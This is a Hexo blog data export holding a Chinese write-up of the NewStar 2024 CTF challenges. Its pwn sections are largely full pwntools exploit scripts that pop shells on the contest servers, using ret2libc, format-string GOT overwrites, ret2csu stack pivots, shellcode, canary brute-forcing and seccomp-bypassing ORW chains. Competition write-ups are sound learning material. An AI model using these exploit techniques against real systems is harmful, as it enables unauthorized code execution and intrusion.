{"meta":{"title":"Hexo","subtitle":"","description":"","author":"John Doe","url":"http://example.com","root":"/"},"pages":[{"title":"所有分类","date":"2024-08-19T15:42:49.874Z","updated":"2024-08-19T15:42:49.874Z","comments":true,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":""},{"title":"","date":"2024-08-19T15:42:32.305Z","updated":"2024-08-19T15:42:32.305Z","comments":true,"path":"about/index.html","permalink":"http://example.com/about/index.html","excerpt":"","text":"下面写关于自己的内容"},{"title":"我的朋友们","date":"2024-08-19T15:43:46.641Z","updated":"2024-08-19T15:43:46.641Z","comments":true,"path":"friends/index.html","permalink":"http://example.com/friends/index.html","excerpt":"这里写友链上方的内容。","text":"这里写友链上方的内容。 这里可以写友链页面下方的文字备注，例如自己的友链规范、示例等。"},{"title":"所有标签","date":"2024-08-19T15:43:06.451Z","updated":"2024-08-19T15:43:06.451Z","comments":true,"path":"tags/index.html","permalink":"http://example.com/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"Newstar_2024_pwn","slug":"Newstar 2024-iamorange","date":"2024-09-29T03:26:56.638Z","updated":"2024-10-28T03:58:30.869Z","comments":true,"path":"2024/09/29/Newstar 2024-iamorange/","permalink":"http://example.com/2024/09/29/Newstar%202024-iamorange/","excerpt":"","text":"Newstar 2024-iamorangeweek1pwnReal Login无需多言，直接反编译看看 输入一串字符串和password对比，正确了就能取得shell，点进去看看password是啥 好的，程序运行直接输入NewStar!!!即可取得shell Game前面流程省去，本地我发现俩个解法，先进ida里看看 发现了时间函数，该函数将在程序运行后的5秒后结束，也就是给你5秒时间 ，让v1累加到大于999，第一种解法很正常，直接通过脚本循环输入，即可拿到shell 1234567891011121314151617181920212223from pwn import *context(os=&quot;linux&quot;, arch=&quot;amd64&quot;, log_level=&quot;debug&quot;) #8.147.132.32 40063#p = process(&#x27;./pwn&#x27;)i=0p = remote(&#x27;8.147.132.32&#x27;,40063)#elf = ELF(&#x27;./pwn&#x27;)#libc = ELF(&#x27;./libc.so.6&#x27;)#p.recvuntil(b&#x27;num:&#x27;)#p.sendline(b&#x27;10&#x27;)while i&lt;99+1: #p.recv(19) p.recvuntil(b&#x27;num:&#x27;) p.sendline(b&#x27;10&#x27;) i+=1#p.send(b&#x27;ls&#x27;)#p.send(b&#x27;cat flag&#x27;)p.interactive()p.recvuntil(b&#x27;num:&#x27;)p.sendline(b&#x27;-1&#x27;) 第二种方法就是直接输入浮点数，即可拿到shell 很明显这里已经取得shell了 overwrite前面检查流程省去，这里我们直接ida看 大体流程为往nbytes里输入东西，最后将nptr转为整数和114514进行比较，若大于直接取得shell 这里我们点开nbytes的栈空间 可以发现在往nbytes中输入时可以覆盖nptr的值，到这里答案已经出来了，直接输入0x30个填充垃圾，最后输入114515即可 gdb这道题没什么难点，直接进gdb一点一点看就能写出来了 这里这看到直接计算该段的长度，可知直接输入这个段即可取得shell exp 12345678910111213from pwn import *from LibcSearcher import * #elf = ELF(&#x27;./vuln&#x27;)context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)p=remote(&#x27;39.106.48.123&#x27;,38828)#p=process(&#x27;./vuln&#x27;)payload=p64(0x4557455355431d5d)p.recvuntil(b&#x27;data:&#x27;)p.send(payload)p.interactive() misc兑换码本题是图片隐写，拿到图片直接丢winhex里把图片的高度调高就可以取得flag pleasingMusic根据提示我们先把音频文件丢进Audacity看看，波形图不是很对劲呀 后段的波形很明显是摩尔斯码，直接获取，找个在线网站转成ascil即可取得flag Labyrinth给提示了，LSB隐写，直接把图片丢进Stegsolve里看看， 直接给二维码了，扫码即可取得flag decompress这题附件是一个压缩包被分成了多份，正常给合并即可解压，但是这里出现了bug，直接用7zip即可查看第一个里面的内容，取得flag 正常流程在linux里面，通过如下指令，将其合并 1cat SiamDW_DATA.zi.0 SiamDW_DATA.zi.1 SiamDW_DATA.zi.2 SiamDW_DATA.zi.3 SiamDW_DATA.zi.4 SiamDW_DATA.zi.5 SiamDW_DATA.zi.6 SiamDW_DATA.zi.7 &gt; SiamDW_DATA.zi 即可成功解压，取得flag，这里很坑的一点是，需要把外面包着的flag{}也要32位小写md5加密，最后再套一层flag{}，这个让我晕了很久 WherelsFlag这题很绕，但是也很简单 webheadach3只会这一题 cryptobase 把题目给的直接拿去解码即可取得flag xor这题直接写个脚本即可写出来 exp 1234567891011121314151617181920212223242526272829from pwn import xor# 替代 bytes_to_long 函数def bytes_to_long(b): return int.from_bytes(b, byteorder=&#x27;big&#x27;)# 替代 long_to_bytes 函数def long_to_bytes(val, endianness=&#x27;big&#x27;): width = (val.bit_length() + 7) // 8 return val.to_bytes(width, byteorder=endianness)# 已知的密文和密钥key = b&#x27;New_Star_CTF&#x27;c1 = 8091799978721254458294926060841c2 = b&#x27;;:\\x1c1&lt;\\x03&gt;*\\x10\\x11u;&#x27;# 解密 c1m1 = long_to_bytes(c1 ^ bytes_to_long(key))print(&#x27;Decrypted m1:&#x27;, m1)# 解密 c2m2 = xor(key, c2)print(&#x27;Decrypted m2:&#x27;, m2)# 拼接出完整的 flagflag = m1.decode() + m2.decode()print(&#x27;Decrypted flag:&#x27;, flag) Reversebegin我是个fw，只会签到题 丢ida看看 按照他的提示一步一步来最后就能取得flag了 Signinez_answer没什么好说的，做就完了 week2pwn出的题非常好，谢谢你们（出题人） ez_game出题人仅存的善良 很普通的ret2libc，如果不懂，去补补基础吧，不多逼逼，直接给exp 以下是exp： 123456789101112131415161718192021222324252627282930313233343536373839from pwn import *#context.log_level=&#x27;debug&#x27;p=remote(&#x27;8.147.132.32&#x27;,18832)context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)elf=ELF(&#x27;./attachment&#x27;)libc=ELF(&#x27;./libc-2.31.so&#x27;)puts_got=elf.got[&#x27;puts&#x27;]puts_plt=elf.plt[&#x27;puts&#x27;]ret=0x400509pop_rdi=0x400783main=0x400686#main=elf.symbols[&#x27;main&#x27;]payload=b&#x27;a&#x27;*(0x50+0x8)payload+=p64(pop_rdi)payload+=p64(puts_got)payload+=p64(puts_plt)payload+=p64(main)p.recvuntil(&quot;NewStarCTF!!!!\\n&quot;)p.sendline(payload)puts_addr = u64(p.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))print(hex(puts_addr))libc_base = puts_addr - libc.sym[&#x27;puts&#x27;]system_addr = libc_base + libc.sym[&#x27;system&#x27;]binsh=libc_base+next(libc.search(b&#x27;/bin/sh&#x27;))p.recvuntil(&quot;NewStarCTF!!!!\\n&quot;)#p.sendline(str(1))p#.recvuntil(&#x27;be encrypted&#x27;)payload=b&#x27;a&#x27;*(0x50+0x8)+p64(ret)+p64(pop_rdi)+p64(binsh)+p64(system_addr)+p64(ret)p.sendline(payload)p.interactive() ez_fmt谢谢你出题人，这道题让我对格式化字符串漏洞的认识更加全面，深刻 不浪费时间，没开pie，开了canary(不用管)，直接丢ida反编译了，给了三次输入输出的机会 三次机会我们要好好利用，第一次我们需要泄露puts_got表地址 1234567payload=b&#x27;%9$saaaa&#x27;payload+=p64(puts_got)#payload+=b&#x27;%15$paac&#x27;#canaryio.recvuntil(&#x27;data: &#x27;)io.send(payload)puts_addr=u64(io.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8,b&#x27;\\x00&#x27;)) 通过计算取得libc基地址，system地址，以及binsh地址 1234567libc_base=puts_addr-libc.sym[&#x27;puts&#x27;]system_addr=libc_base+libc.sym[&#x27;system&#x27;]printf_addr=libc_base+libc.sym[&#x27;printf&#x27;]binsh=libc_base+next(libc.search(b&#x27;/bin/sh&#x27;))#puts 0x7f01dee80e50#system 0x7f01dee50d70#printf 0x7f01dee606f0 第二次我们需要劫持printf got表，将其修改为system的地址，到这里，才是这道题的难点，这里的我们能输入的只有0x30个字节，如果直接使用fmtstr_payload，是行不通的，因为他需要更大的输入空间，所以我们只能手动去覆盖了，这里我想到了3种覆盖方式，只hn覆盖，只使用hhn覆盖，混合使用hn,hhn覆盖，第一种只使用hn覆盖，经过我的实验，行不通 第二种只是用hhn覆盖，我最少使用了0x38个字节，这个方法也不可用 第三种可行，这些函数的后5个16进制数不会改变，这里我们必须先修改倒数第三个字节，再修改后俩个字节，因为修改倒数第三个字节需要的字符数少，这是%n的特性，这里看不懂可以去补一下基础， 12345678910111213system1=system_addr&amp;0xffffsystem2=(system_addr&gt;&gt;16)&amp;0xff#system3=(system_addr&gt;&gt;16)&amp;0xff#system4=(system_addr&gt;&gt;32)&amp;0xffpayload1 = b&quot;%&quot;+ str(system2).encode() + b&quot;c%12$hhn&quot;payload1 += b&quot;%&quot; + str(system1 -system2 ).encode() + b&quot;c%13$hn&quot;payload1 = payload1.ljust(0x20,b&#x27;a&#x27;)payload1 += p64(printf_got + 0x2)payload1 += p64(printf_got) 第三次输入，我们直接输入’&#x2F;bin&#x2F;sh’，直接充当printf的参数，由于上一次以及将printf的got地址覆盖为system，那么下面执行printf时，相当于执行了system(&#x2F;bin&#x2F;sh)，这样就取得了shell。 123payload2 = b&#x27;/bin/sh\\x00&#x27;io.recv()io.send(payload2) 以下是完整exp: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465from pwn import *from LibcSearcher import LibcSearchercontext.log_level=&#x27;debug&#x27;#39.106.48.123 15520io=remote(&#x27;39.106.48.123&#x27;,15520)#io=process(&#x27;./fmt&#x27;)elf=ELF(&#x27;./fmt&#x27;)libc=ELF(&#x27;./libc.so.6&#x27;)puts_got=elf.got[&#x27;puts&#x27;]printf_got=elf.got[&#x27;printf&#x27;]#puts 0x7f01dee80e50#system 0x7f01dee50d70#printf 0x7f01dee606f0payload=b&#x27;%9$saaaa&#x27;payload+=p64(puts_got)#payload+=b&#x27;%15$paac&#x27;#canaryio.recvuntil(&#x27;data: &#x27;)io.send(payload)puts_addr=u64(io.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8,b&#x27;\\x00&#x27;))print(hex(puts_addr))libc_base=puts_addr-libc.sym[&#x27;puts&#x27;]system_addr=libc_base+libc.sym[&#x27;system&#x27;]printf_addr=libc_base+libc.sym[&#x27;printf&#x27;]binsh=libc_base+next(libc.search(b&#x27;/bin/sh&#x27;))print(hex(system_addr))print(hex(printf_addr))io.recv()#io.recvuntil(&#x27;data: &#x27;)&quot;&quot;&quot;offset=8payload1=fmtstr_payload(offset, &#123;puts_got: p64(system_addr)&#125;)print(len(payload1))#io.recvuntil(&#x27;\\x40&#x27;)&quot;&quot;&quot;system1=system_addr&amp;0xffffsystem2=(system_addr&gt;&gt;16)&amp;0xff#system3=(system_addr&gt;&gt;16)&amp;0xff#system4=(system_addr&gt;&gt;32)&amp;0xffpayload1 = b&quot;%&quot;+ str(system2).encode() + b&quot;c%12$hhn&quot;payload1 += b&quot;%&quot; + str(system1 -system2 ).encode() + b&quot;c%13$hn&quot;payload1 = payload1.ljust(0x20,b&#x27;a&#x27;)payload1 += p64(printf_got + 0x2)payload1 += p64(printf_got)print(len(payload1))io.send(payload1)payload2 = b&#x27;/bin/sh\\x00&#x27;io.recv()io.send(payload2)io.interactive() Inverted World这题不算难，题目给了提示，直接ida反编译，仔细看看还有后门函数 细细一看，这read有问题呀，自己写的read，这导致输入在栈中的存储顺序颠倒了 当看到这一层时，这题的解法就已经出来了，类似于一个普通栈溢出，本来还想着怎么修改hackable 的值，才想起来，可以直接跳过去 以下是完整exp: 12345678910111213141516171819202122#coding:utf-8from pwn import *from LibcSearcher import *context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)#nc 8.147.132.32 21031p=remote(&#x27;8.147.132.32&#x27;,21031)#p=process(&#x27;./pwn&#x27;)elf=ELF(&#x27;./pwn&#x27;)libc=ELF(&#x27;./libc.so.6&#x27;)#gdb.attach(p)backdoor=0x401365payload=b&#x27;a&#x27;*0x100+b&#x27;\\x00\\x00\\x00\\x00\\x00\\x40\\x13\\x7c&#x27;p.recv()p.sendline(payload)p.interactive() 由于read函数不一样，所以要输入hs才能取得shell My_GBC非常绕的一道题，绕死我了，checksec以下，直接进ida反编译了 需要我们输入，然后将我们的输入以一种方式加密后，输出给我们 所以我们需要写一段脚本，利用该脚本，将地址调整为一段被加密后恢复的字符 以下是该段脚本 12345678910111213141516171819def decrypt(data, key): decrypted_data = bytearray(len(data)) for i in range(len(data)): # 先进行循环右移3位 decrypted_byte = ((data[i] &gt;&gt; 3) | (data[i] &lt;&lt; (8 - 3))) &amp; 0xFF # 再进行异或操作 decrypted_data[i] = decrypted_byte ^ key return decrypted_data# 示例使用encrypted_data = bytearray([0x70, 0X10, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00])key = 90 # 假设密钥是0xb8decrypted_data = decrypt(encrypted_data, key)try: print(decrypted_data.decode(&#x27;utf-8&#x27;))except UnicodeDecodeError: print(&quot;使用 latin-1 解码:&quot;)print(decrypted_data.decode(&#x27;latin-1&#x27;))# 调用解密函数print(&quot;解密后的原始字节:&quot;, decrypted_data) 第一个问题解决了，这道题就是一道栈溢出的题的，这道题并没有给后门函数，所以需要我们自己构造，这里我想到的是利用__libc_csu_init_段去控制寄存器的值，首先要泄露write got表地址 123456789payload=b&#x27;A&#x27;*0x18payload+=gadget1payload+=b&#x27;Z&#x27;*0x10 #rbx 0payload+=b&#x27;zZZZZZZZ&#x27;#rbp 1payload+=b&#x27;zZZZZZZZ&#x27;#r12 rdipayload+=write_got #r13 rsi payload+=b&#x27;PZZZZZZZ&#x27;#r14 rdx 0x50 payload+=write_got#r15 back_addrpayload+=gadget2 接收后计算出system，binsh的地址 123456789101112p.recvuntil(b&#x27;\\x4f&#x27;)p.send(payload)write_addr=u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8,b&#x27;\\x00&#x27;))print(&#x27;write_addr-&gt;&#x27;,hex(write_addr))libc_base=write_addr-libc.sym[&#x27;write&#x27;]system=libc_base+libc.sym[&#x27;system&#x27;]binsh=libc_base+next(libc.search(b&#x27;/bin/sh&#x27;))print(&#x27;libc_base-&gt;&#x27;,hex(libc_base))print(&#x27;system-&gt;&#x27;,hex(system))print(&#x27;binsh-&gt;&#x27;,hex(binsh)) 最后构造一个read(0,bss,0x50)的函数，再通过栈迁移执行构造的栈空间，执行system需要使用ret平衡一下栈空间 以下是完整exp： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667#coding:utf-8from pwn import *from LibcSearcher import *context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)#8.147.132.32 16133p=remote(&#x27;8.147.132.32&#x27;,16133)#p=process(&#x27;./gbc&#x27;)elf=ELF(&#x27;./gbc&#x27;)libc=ELF(&#x27;./libc.so.6&#x27;)bss_addr=b&#x27;VSRZZZZZ&#x27;#0x404860gadget1=b&#x27;\\x8e8RZZZZZ&#x27; #0x04013A6gadget2=b&#x27;H8RZZZZZ&#x27; #0x0401390offset=0x10read=b&#x27;TXRZZZZZ&#x27;#0x401070read_got=b&#x27;^RRZZZZZ&#x27;#0x404020read_plt=b&#x27;\\xd4XRZZZZZ&#x27; #0x401074write_got=b&#x27;YRRZZZZZ&#x27; #0x404018write_plt=b&#x27;VXRZZZZZ&#x27; #0x401060leave=b&#x27;28RZZZZZ&#x27; #0x401343ret=0x401344main=B&#x27;\\xd3\\x18RZZZZZ&#x27;pop_rdi=0x4013b3write=b&#x27;&#125;8RZZZZZ&#x27; #0x401339payload=b&#x27;A&#x27;*0x18payload+=gadget1payload+=b&#x27;Z&#x27;*0x10 #rbx 0payload+=b&#x27;zZZZZZZZ&#x27;#rbp 1payload+=b&#x27;zZZZZZZZ&#x27;#r12 rdipayload+=write_got #0x500#r13 rsi #执行一次syscall之后，rax就变成了0x3bpayload+=b&#x27;PZZZZZZZ&#x27;#r14 #rdx 0x50 #将/bin/sh写入bss段payload+=write_got#r15 back_addr#构造write泄露write_gotpayload+=gadget2payload+=b&#x27;Z&#x27;*0x10 #rbx 0payload+=b&#x27;zZZZZZZZ&#x27;#rbp 1payload+=b&#x27;ZZZZZZZZ&#x27;#r12 rdipayload+=bss_addr #r13 rsi payload+=b&#x27;PZZZZZZZ&#x27;#r14 rdx 0x50 payload+=read_got#r15 back_addrpayload+=gadget2#第二次构造read(0,bss,0x50)payload+=b&#x27;Z&#x27;*0x10payload+=bss_addr #rbppayload+=b&#x27;Z&#x27;*0x20payload+=leave #栈迁移p.recvuntil(b&#x27;\\x4f&#x27;)p.send(payload)write_addr=u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8,b&#x27;\\x00&#x27;))libc_base=write_addr-libc.sym[&#x27;write&#x27;]system=libc_base+libc.sym[&#x27;system&#x27;]binsh=libc_base+next(libc.search(b&#x27;/bin/sh&#x27;))print(&#x27;write_addr-&gt;&#x27;,hex(write_addr))print(&#x27;libc_base-&gt;&#x27;,hex(libc_base))print(&#x27;system-&gt;&#x27;,hex(system))print(&#x27;binsh-&gt;&#x27;,hex(binsh))payload2=p64(8)+p64(ret)+p64(pop_rdi)+p64(binsh)+p64(system)p.recv()p.send(payload2)p.interactive() Bad_Asm题如其名，very bad,直接ida看看 需要我们手写一段shellcode，这里可以看出，在我们的shellcode里，不可以有\\x00,也不可以有\\x05\\x0f，点进exec这个函数一看，还有要求 执行shellcode时，清空了除rdi,rsi外的所有寄存器，这导致了我们也无法使用push,pop来操作栈空间，这里我们就写出了第一种shellcode, 1234567891011121314sc=&#x27;&#x27;&#x27; mov al,0x5 xor [rdi+0x30], rax xor rdi, rdi mov rcx, 0x68732f6e69622f2f shr rcx, 8 mov [rsi],rcx mov rdi,rsi xor rsi,rsi mov al, 59 &#x27;&#x27;&#x27;payload=asm(sc).ljust(0x2f,b&#x27;\\x90&#x27;)+b&#x27;\\x0f&#x27;&quot;&quot;&quot; 再精简一下 12345678sc = &#x27;&#x27;&#x27;xor byte ptr [rdi+0xe], 0x5lea rdi, [rsi+0x10]xor rsi, rsimov al, 0x3b&#x27;&#x27;&#x27;payload = asm(sc) + p8(0xf)payload = payload.ljust(0x10, b&#x27;\\0&#x27;) + b&#x27;/bin/sh\\0&#x27; 以下是完整exp： 1234567891011121314151617181920212223242526272829303132333435363738394041#coding:utf-8from pwn import *from LibcSearcher import *context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)#8.147.132.32 26891p=remote(&#x27;8.147.132.32&#x27;,26891)#p=process(&#x27;./asm&#x27;)#elf=ELF(&#x27;./asm&#x27;)#libc=ELF(&#x27;./libc.so.6&#x27;)#gdb.attach(p)#7ffed664f000 sc = &#x27;&#x27;&#x27;xor byte ptr [rdi+0xe], 0x5lea rdi, [rsi+0x10]xor rsi, rsimov al, 0x3b&#x27;&#x27;&#x27;payload = asm(sc) + p8(0xf)payload = payload.ljust(0x10, b&#x27;\\0&#x27;) + b&#x27;/bin/sh\\0&#x27;#payload=asm(sc)p.recvuntil(b&#x27;\\x0a&#x27;)p.recv()p.send(payload)#p.send(b&#x27;cat flag&#x27;)p.interactive()&quot;&quot;&quot;sc=&#x27;&#x27;&#x27; mov al,0x5 xor [rdi+0x30], rax xor rdi, rdi mov rcx, 0x68732f6e69622f2f shr rcx, 8 mov [rsi],rcx mov rdi,rsi xor rsi,rsi mov al, 59 &#x27;&#x27;&#x27;payload=asm(sc).ljust(0x2f,b&#x27;\\x90&#x27;)+b&#x27;\\x0f&#x27;&quot;&quot;&quot; 第一种 第二种 miscwireshark_checkin直接把附件丢到wireshark里找一下就能找到了 wireshark_secret同上一道题，先找 找到一张png，用脚本将该二进制数据转成图片,以下是脚本 1234567891011121314# 你提供的十六进制字符串hex_data = &quot;aaaa&quot; # 截断以节省空间，需使用完整hex数据# 将 hex 数据转换为字节image_data = bytes.fromhex(hex_data)# 指定新的保存路径save_path = &quot;C:/Users/YourUsername/Pictures/output_image.png&quot; # 替换为你想要的完整路径# 将字节数据写入文件with open(save_path, &quot;wb&quot;) as img_file: img_file.write(image_data)print(f&quot;图片已保存为 &#123;save_path&#125;&quot;) 打开该后发现 用溯流仪见证伏特台风Google直接搜到原图片https://pub1-bjyt.s3.360.cn/bcms/Volt_Typhoon.pdf 直接用flag{}包一下就可以了 你也玩原神吗把gif文件丢stegsolve里，直接取帧，拿到图片 蟹蟹你出题人，用提瓦特语言翻译，左下角的文字是do you know fence提示了，左上角的翻译是flag是一句话，将右下角的字符串解密 用flag{}包一下就可以了 字里行间的秘密考点0宽字符 这是docx的密码进去看看 直接拿到flag了 week3pwnEZcanary直接ida看反编译，很明显while循环fork开启子进程，很明显的canary爆破问题 这种题很看运气，有时候能爆破成功，有时候不行 以下是完整exp 1234567891011121314151617181920212223242526272829303132333435363738#coding:utf-8from pwn import *from LibcSearcher import *context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)#8.147.132.32 18828p=remote(&#x27;8.147.132.32&#x27;,18828)#p=process(&#x27;./ezcanary&#x27;)#elf=ELF(&#x27;./ezcanary&#x27;)#libc=ELF(&#x27;./libc.so.6&#x27;)backdoor=0x401236canary = b&#x27;\\x00&#x27;# 猜测 canary 的前三个字节，逐字节暴力破解for k in range(7): for i in range(256): p.recvuntil(&quot;\\x9f\\x0a&quot;) p.send(b&#x27;a&#x27;*0x58 + canary + p8(i)) a = p.recv() p.recv() p.sendline(b&#x27;1&#x27;) if b&quot;smashing&quot; not in a: canary += p8(i) break print(canary)# Canary 完整破解后，可以继续构造下一步的 exploitp.recvuntil(b&#x27;\\x9f\\x0a&#x27;)p.sendline(b&#x27;1&#x27;)p.recv()p.sendline(b&#x27;cat flag&#x27;)p.recvuntil(&#x27;flag is one_by_one_bruteforce&#x27;)payload=b&#x27;a&#x27;*0x58+canary+b&#x27;a&#x27;*8+p64(backdoor)p.sendline(payload)p.interactive() 不思議なscanf直接ida看 给了15次输入的机会，产生了数组越界漏洞，这题开了canary，难点在于怎么在轮到canary时，输入不覆盖cananry 这是一个小知识 1如果输入有多个且使用多个scanf语句（含循环，即一个scanf中仅有一个输入），则输入非数字时，如果输入的不是’+’或’-’，则后面紧跟的所有scanf均自动跳过，变为无效，不能输入。如果输入的是’+’或’-’，则会跳过当前输入，后面仍然可以进行输入。 既然知道了这个，我们就可以在轮到canary时输入’’+’’ or ‘’-‘’，来跳过，接着将返回地址覆盖为后门函数即可 以下是exp 1234567891011121314151617181920212223242526272829303132333435363738394041#coding:utf-8from pwn import *from LibcSearcher import *context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)# nc 8.147.132.32 14873p=remote(&#x27;8.147.132.32&#x27;,14873)#p=process(&#x27;./ezcanary&#x27;)#elf=ELF(&#x27;./ezcanary&#x27;)#libc=ELF(&#x27;./libc.so.6&#x27;)backdoor=0x40123Bdef attack(part): p.recvuntil(&#x27;！&#x27;) p.sendline(part)attack(b&#x27;1&#x27;)attack(b&#x27;1&#x27;)attack(b&#x27;1&#x27;)attack(b&#x27;1&#x27;)attack(b&#x27;1&#x27;)attack(b&#x27;1&#x27;)#填充栈空间attack(b&#x27;-&#x27;)attack(b&#x27;+&#x27;)#绕过canaryattack(b&#x27;1&#x27;)attack(b&#x27;1&#x27;)#覆盖rbpattack(b&#x27;4199009&#x27;)attack(b&#x27;0&#x27;)#覆盖返回地址attack(b&#x27;1&#x27;)attack(b&#x27;1&#x27;)attack(b&#x27;1&#x27;)attack(b&#x27;1&#x27;) p.interactive() Easy_ShellcodeEazy吗？不eazy！直接看ida反编译， 开启了沙盒函数，开启一段可执行空间，看看禁用了啥，把execve，execveat,open,write,read禁用了，还好给了提示openat,writev,preadv2可以使用 但是似乎不止这些，fgets函数遇到\\x00会停止读入，这就又多了一条限制，shellcode中不可以含有\\x00 以下是完整exp 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758#coding:utf-8from pwn import *from LibcSearcher import *context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)#39.106.48.123 19775p=remote(&#x27;39.106.48.123&#x27;,19775)#p=process(&#x27;./shell&#x27;)elf=ELF(&#x27;./shell&#x27;)#libc=ELF(&#x27;./libc.so.6&#x27;)#gdb.attach(p)shellcode = asm(&#x27;&#x27;&#x27; xor rax,rax mov rsp,rbp mov eax, 0x67616c66 push rax xor rax,rax xor rdi, rdi sub rdi, 100 mov rsi, rsp xor edx, edx xor r10, r10 mov ax,0x101 syscall push 3 pop rdi push 0x1010 lea rbx, [rsp+8] push rbx mov rsi, rsp push 1 pop rdx xor r10, r10 xor r8, r8 mov ax,0x147 syscall push 1 pop rdi push 0x1 pop rdx push 0x1010 lea rbx, [rsp+8] push rbx mov rsi, rsp push 20 pop rax syscall&#x27;&#x27;&#x27;)p.recvuntil(b&#x27;World!\\n&#x27;)p.send(shellcode)p.interactive() One Last B1te看看ida反编译吧，给了一次任意地址写一字节的机会，又给了一次栈溢出的机会，开了沙盒禁用了execve 本想着就是一次普通的ret2libc，但是事情并没有那么简单，close(1)关闭的标准输出，这导致的正常栈溢出无法构造write泄露，怎么办呢，劫持close，或者绕过close，调试的时候发现有点意思，执行close是三个参数给了我思路，假如这里我执行的是write函数，就会直接把栈空间打印出来 所以思路就是通过任意地址写一字节，劫持close，使其执行write函数 接着接收栈空间数据，通过__libc_start_main+139来计算libc的基地址 由于是先写出第三个read，再执行close（被劫持），所以得先通过溢出返回read，不过这里直接返回，由于我们的覆盖导致rbp丢失，这里，我们得先回到init函数初始化后，再来到该read函数处，通过构造orw，打印出flag 以下是完整exp 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667#coding:utf-8from pwn import *from LibcSearcher import *context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)#39.106.48.123 17975filename=&#x27;./one&#x27;a=1if a==1: p=remote(&#x27;39.106.48.123&#x27;,17975)else: p=process(filename) gdb.attach(p) elf=ELF(filename)libc=ELF(&#x27;./libc.so.6&#x27;)close=elf.got[&#x27;close&#x27;]init=0x4011f6main_read=0x401421bss=0x404500payload=b&#x27;a&#x27;*0x10+p64(bss)+p64(init)+p64(main_read)#第一次执行mainp.recvuntil(b&#x27;\\x3a\\x20&#x27;)p.send(p64(close)) p.recvuntil(b&#x27;\\x3a\\x20\\x00&#x27;)p.send(b&#x27;\\xc0&#x27;) sleep(1)p.send(payload) p.recv(0xb8)libc_main_start = int.from_bytes(p.recv(6), byteorder=&#x27;little&#x27;)-139 p.recv()print(hex(libc_main_start))libc_base=libc_main_start-libc.sym[&#x27;__libc_start_main&#x27;]pop_rdi=libc_base+0x10f75bpop_rsi=libc_base+0x110a4d pop_rdx=libc_base+0x66b9a read=libc_base+libc.sym[&#x27;read&#x27;]open_addr=libc_base+libc.sym[&#x27;open&#x27;]write=libc_base+libc.sym[&#x27;write&#x27;]payload=b&#x27;a&#x27;*0x18+p64(pop_rdi)+p64(0)+p64(pop_rsi)+p64(bss)+p64(read)payload+=p64(pop_rdi)+p64(bss)+p64(pop_rsi)+p64(0)+p64(open_addr)payload+=p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(bss+0x20)+p64(pop_rdx)+p64(0x30)+p64(read)payload+=b&#x27;a&#x27;*0x19payload+=p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(bss+0x20)+p64(write)print(hex(len(payload)))#第二次执行程序中的readp.recv()p.send(payload) sleep(1)p.send(b&#x27;./flag\\x00\\x00&#x27;) p.interactive() miscOSINT-MASTER给了一张图片 可以看到机翼上的数字B-2419，这是飞机的注册号，直接去Google搜索一下,可以搜到该飞机 这里我们需要知道照片拍摄的时间，通过exiftool工具获取到了图片的拍摄时间，这里就好办了 直接在该网站搜索当日的航班，时间对应的只有一个航班 点进去看看，每个时间点的经纬度都给出来了，找到14.30的地点 通过谷歌地图搜索 flag就出来了(气死了，记事本不显示下划线，导致的我的格式出错，差点怀疑人生) flag{MU5156_济宁市} week4pwnSign in拿到附件，直接执行一遍，先让我们输入名字，然后弹出一个菜单 让我们看看每个功能的作用2.View estrained relationship,展示优劣对位关系 4.show your data展示分数 下面我就不看了，看看反编译，很明显，文件以json格式保存在靶机内，分数大于1145后即可取得shell 玩过单机游戏的想必都懂，5.回档，6.存档，这题的解题思路也正是如此，通过循环战斗，不断的回档存档直到达到足够的分数，即可取得shell，如图，刷够足够的分数即可取得shell 以下是exp 123456789101112131415161718192021222324252627282930313233343536#coding:utf-8from pwn import *from LibcSearcher import *context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)#39.106.48.123 17975filename=&#x27;./read&#x27;#8.147.129.74 36865p=remote(&#x27;8.147.129.74&#x27;,36865)#Berserkerp.recvuntil(b&#x27;Enter your name: &#x27;)p.sendline(b&#x27;orange&#x27;)p.recvuntil(b&#x27;6. Save file\\n&#x27;)p.sendline(b&#x27;5&#x27;)p.recvuntil(b&#x27;orange.json\\n&#x27;)p.sendline(b&#x27;1&#x27;)for i in range(200): p.recvuntil(b&#x27;6. Save file\\n&#x27;) p.sendline(b&#x27;1&#x27;) p.recvuntil(b&#x27;your class: &#x27;) p.sendline(b&#x27;Berserker&#x27;) #通过功能2可以看出，该职业胜率更高 p.recvline() a=p.recvline() p.recv() p.sendline(b&#x27;1&#x27;) p.sendline(b&#x27;1&#x27;) if b&quot;You beated&quot; in a: p.sendline(b&#x27;6&#x27;) p.recvuntil(b&#x27;orange.json\\n&#x27;) p.sendline(b&#x27;1&#x27;) else: p.sendline(b&#x27;5&#x27;) p.recvuntil(b&#x27;orange.json\\n&#x27;) 